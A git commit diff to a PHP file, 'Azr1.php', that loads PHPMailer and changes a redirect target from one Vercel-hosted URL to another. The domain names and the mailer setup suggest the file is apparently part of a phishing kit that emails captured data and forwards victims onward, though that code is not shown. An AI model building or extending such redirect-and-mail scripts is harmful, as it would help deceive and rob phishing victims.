3cfcfb0362ff3d797cd43b4614ec69ae658f9686
Ghaliya3399 <ghaliyaaliyounisaneza@gmail.com>
2025-08-31 15:56:57 +0500

    Update Azr1.php

--- Azr1.php
+++ Azr1.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://page-contact-account-infe.vercel.app/");
+header("Location: https://zero-team-sure-free.vercel.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
